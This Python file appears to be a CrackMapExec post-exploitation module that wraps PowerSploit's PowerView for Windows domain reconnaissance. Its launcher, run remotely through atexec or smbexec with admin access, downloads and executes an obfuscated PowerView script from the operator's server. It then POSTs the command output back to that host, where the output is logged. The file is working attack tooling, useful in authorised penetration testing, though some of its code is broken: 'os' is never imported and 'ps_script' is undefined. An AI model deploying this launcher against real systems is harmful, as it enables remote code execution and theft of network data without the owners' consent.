from cme.helpers import create_ps_command, obfs_ps_script, get_ps_script, write_log
from StringIO import StringIO
from datetime import datetime
from sys import exit

class CMEModule:
    '''
        Wrapper for PowerView's functions
        Module by @byt3bl33d3r
    '''

    name = 'powerview'

    description = "Wrapper for PowerView's functions"

    chain_support = False

    def options(self, context, module_options):
        '''
            COMMAND  Command to execute on the target system(s) (Required if CMDFILE isn't specified)
            CMDFILE  File contaning the command to execute on the target system(s) (Required if CMD isn't specified)
        '''

        if not 'COMMAND' in module_options and not 'CMDFILE' in module_options:
            context.log.error('COMMAND or CMDFILE options are required!')
            exit(1)

        if 'COMMAND' in module_options and 'CMDFILE' in module_options:
            context.log.error('COMMAND and CMDFILE are mutually exclusive!')
            exit(1)

        if 'COMMAND' in module_options:
            self.command = module_options['COMMAND']

        elif 'CMDFILE' in module_options:
            path = os.path.expanduser(module_options['CMDFILE'])

            if not os.path.exists(path):
                context.log.error('Path to CMDFILE invalid!')
                exit(1)

            with open(path, 'r') as cmdfile:
                self.command = cmdfile.read().strip()

    def launcher(self, context, command):
        powah_command = command + ' | Out-String'

        launcher = '''
        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/PowerView.ps1');
        $data = {command}
        $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
        $request.Method = 'POST';
        $request.ContentType = 'application/x-www-form-urlencoded';
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($data);
        $request.ContentLength = $bytes.Length;
        $requestStream = $request.GetRequestStream();
        $requestStream.Write( $bytes, 0, $bytes.Length );
        $requestStream.Close();
        $request.GetResponse();'''.format(server=context.server, 
                                          port=context.server_port, 
                                          addr=context.localip,
                                          command=powah_command)

        return create_ps_command(launcher)

    def payload(self, context, command):
        with open(get_ps_script('PowerSploit/Recon/PowerView.ps1'), 'r') as ps_script:
            return obfs_ps_script(ps_script.read())

    def on_admin_login(self, context, connection, launcher, payload):
        connection.execute(launcher, methods=['atexec', 'smbexec'])
        context.log.success('Executed launcher')

    def on_request(self, context, request):
        if 'PowerView.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(ps_script)

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.getheader('content-length'))
        data = response.rfile.read(length)

        #We've received the response, stop tracking this host
        response.stop_tracking_host()

        if len(data):
            def print_post_data(data):
                buf = StringIO(data.strip()).readlines()
                for line in buf:
                    context.log.highlight(line.strip())

            print_post_data(data)

            log_name = 'PowerView-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
            write_log(data, log_name)
            context.log.info("Saved output to {}".format(log_name))